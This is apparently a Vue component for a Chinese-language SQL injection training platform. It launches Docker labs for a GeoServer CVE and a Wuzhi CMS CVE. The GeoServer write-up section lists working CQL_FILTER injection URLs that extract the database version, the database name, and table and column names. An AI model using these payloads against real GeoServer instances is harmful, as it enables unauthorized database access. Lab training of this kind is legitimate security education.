<script setup>

import { ref, onMounted } from 'vue';

const isLoading = ref({
    test1: false,
    test2: false,
});

const imagePath = ref('');



// 从本地存储中获取初始状态
const isDockerComposeUp = ref(localStorage.getItem('isDockerComposeUp') === 'true');
const test2Up = ref(localStorage.getItem('test2Up') === 'true');

const test1 = 'CVE-2023-25157';
const test2 = 'CVE-2023-52064';


const toggleDockerCompose = async (directory) => {
    try {
        isLoading.value[directory] = true;

        if (directory === test1) {

            if (isDockerComposeUp.value) {
                await stopEnvironment(directory);

            } else {
                await startEnvironment(directory);

            }
            isDockerComposeUp.value = !isDockerComposeUp.value;

            // 存储按钮状态
            localStorage.setItem('isDockerComposeUp', isDockerComposeUp.value);
        }

        // test2
        if (directory === test2) {

            if (test2Up.value) {
                await stopEnvironment(directory);

            } else {
                await startEnvironment(directory);

            }

            test2Up.value = !test2Up.value;

            localStorage.setItem('test2Up', test2Up.value);
        }


    } catch (error) {

        console.error('Error toggling Docker Compose:', error);

    } finally {

        isLoading.value[directory] = false;

    }
};

const startEnvironment = async (directory) => {
    try {
        const response = await axios.post('/startEnvironment', { directory });
        imagePath.value = response.data.imagePath;
    } catch (error) {
        console.error('Error starting environment:', error);
    }
};

const stopEnvironment = async (directory) => {
    try {
        await axios.post('/stopEnvironment', { directory });
    } catch (error) {
        console.error('Error stopping environment:', error);
    }
};

onMounted(() => {
    // 组件加载后从本地存储中恢复按钮状态
    isDockerComposeUp.value = localStorage.getItem('isDockerComposeUp') === 'true';
    test2Up.value = localStorage.getItem('test2Up') === 'true';
});


</script>


<template>
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">SQLi Environment</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><router-link to="/admin/home">Home</router-link></li>
                        <li class="breadcrumb-item"><a href="#">SQL Injection</a></li>
                        <li class="breadcrumb-item active">SQLi Environment</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>


    <div class="content">
        <div class="container-fluid">
            <div class="card card-primary card-outline">
                <div class="card-header">
                    <h5 class="m-0">CVE-2023-25157 GeoServer OGC Filter</h5>
                </div>
                <div class="card-body">
                    <h6 class="card-title">漏洞介绍</h6>
                    <p class="card-text">GeoServer 的 OGC 查询存在 SQL 注入漏洞。GeoServer 是一个用 Java
                        编写的开源软件服务器，允许用户共享和编辑地理空间数据，GeoServer 基于
                        Spring 开发，使用到了GeoTools库。在OGC 查询中存在 SQL 注入漏洞。</p>
                    <h6 class="card-title">影响版本</h6>
                    <p class="card-text">GeoServer 2.21.4，2.22.2 </p>
                    <p class="card-text">GeoTools 28.2、27.4、26.7、25.7、24.7</p>

                    <button @click="toggleDockerCompose(test1)" type="button" class="btn card-link"
                        style="min-width: 100px;" :class="isDockerComposeUp ? 'bg-maroon' : 'btn-primary'"
                        :disabled="isLoading[test1]">
                        <div v-if="isLoading[test1]" class="spinner-border spinner-border-sm" role="status"
                            aria-hidden="true">
                            <span class="sr-only">Loading...</span>
                        </div>
                        <span v-else>{{ isDockerComposeUp ? '关闭环境' : '启动环境' }}</span>
                    </button>
                    <div v-if="isDockerComposeUp && imagePath">
                        <p>您可以访问环境：{{ imagePath }}</p>
                    </div>

                </div>
            </div>
            <div class="card collapsed-card">
                <div class="card-header">
                    <h3 class="card-title">Write up</h3>
                    <div class="card-tools">
                        <!-- Collapse Button -->
                        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i
                                class="fas fa-plus"></i></button>
                    </div>
                    <!-- /.card-tools -->
                </div>
                <!-- /.card-header -->
                <div class="card-body">
                    <h5 class="card-title">获取地理图层列表信息</h5>
                    <p class="card-text">
                        访问："/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities"
                    </p>
                    <img src="/images/geo1.png" style="max-width: 100%; height: auto;">
                    <h5 class="card-title">获取图层属性名称</h5>
                    <p class="card-text">使用图层："nyc:nyc_buildings"</p>
                    <p class="card-text">
                        访问："/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&maxFeatures=1&outputFormat=json"
                    </p>
                    <p class="card-text">关键信息：需要使用属性"bin"，属性结构为 "geometry_name":"the_geom","properties":{"bin":0}</p>

                    <h5 class="card-title">数据库信息查询：</h5>

                    <p class="card-text">1. 查询数据库版本：</p>
                    <p class="card-text">
                        访问："/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&CQL_FILTER=strStartsWith%28bin%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+INTEGER%29%29+--+%27%29+%3D+true"
                    </p>

                    <p class="card-text">2. 查询数据库名称：</p>
                    <p class="card-text">
                        请求链接："http://192.168.146.130:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&CQL_FILTER=strStartsWith%28bin%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+current_database()%29+AS+INTEGER%29%29+--+%27%29+%3D+true"
                    </p>

                    <p class="card-text">3. 查询所有表的名称：</p>
                    <p class="card-text">
                        请求链接："http://192.168.146.130:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&CQL_FILTER=strStartsWith(bin%2C%27x%27%27)+%3D+true+and+1%3D(SELECT+CAST+((SELECT+STRING_AGG+(+concat(table_schema+,+%27%27.%27%27+,+table_name)+,+%27%27,%27%27+)+from+INFORMATION_SCHEMA.TABLES)+AS+INTEGER))+--+%27)+%3D+true"
                    </p>

                    <p class="card-text">4. 查询特定表的所有列名：</p>
                    <p class="card-text">
                        请求链接："http://192.168.146.130:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&CQL_FILTER=strStartsWith(bin%2C%27x%27%27)+%3D+true+and+1%3D(SELECT+CAST+((SELECT+STRING_AGG+(+column_name+,+'',''+)+from+INFORMATION_SCHEMA.columns+where+table_name+=+''{tblname}''+and+table_schema=''{schemaname}'')+AS+INTEGER))+--+%27)+%3D+true"
                    </p>

                </div>
                <!-- /.card-body -->
            </div>
            <!-- test -->
            <div class="card card-primary card-outline">
                <div class="card-header">
                    <h5 class="m-0">CVE-2023-52064 五指CMS SQL注入漏洞</h5>
                </div>
                <div class="card-body">
                    <h6 class="card-title">漏洞介绍</h6>
                    <p class="card-text">五指CMS的/core/admin/copyfrom.php
                        $keywords参数存在SQL注入漏洞，经过身份验证的攻击者可通过该漏洞获取数据库中的信息之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限</p>
                    <h6 class="card-title">影响版本</h6>
                    <p class="card-text">
                        Wuzhicms &lt;= v4.1.0</p>

                    <button @click="toggleDockerCompose(test2)" type="button" class="btn card-link"
                        style="min-width: 100px;" :class="test2Up ? 'bg-maroon' : 'btn-primary'"
                        :disabled="isLoading[test2]">
                        <div v-if="isLoading[test2]" class="spinner-border spinner-border-sm" role="status"
                            aria-hidden="true">
                            <span class="sr-only">Loading...</span>
                        </div>
                        <span v-else>{{ test2Up ? '关闭环境' : '启动环境' }}</span>
                    </button>
                    <div v-if="test2Up && imagePath">
                        <p>您可以访问环境：{{ imagePath }}</p>
                    </div>


                </div>
            </div>
            <div class="card collapsed-card">
                <div class="card-header">
                    <h3 class="card-title">Write up</h3>
                    <div class="card-tools">
                        <!-- Collapse Button -->
                        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i
                                class="fas fa-plus"></i></button>
                    </div>
                    <!-- /.card-tools -->
                </div>
                <!-- /.card-header -->
                <div class="card-body">
                    <h5 class="card-title"></h5>
                    <p class="card-text">

                    </p>


                </div>
                <!-- /.card-body -->
            </div>
        </div>
    </div>
</template>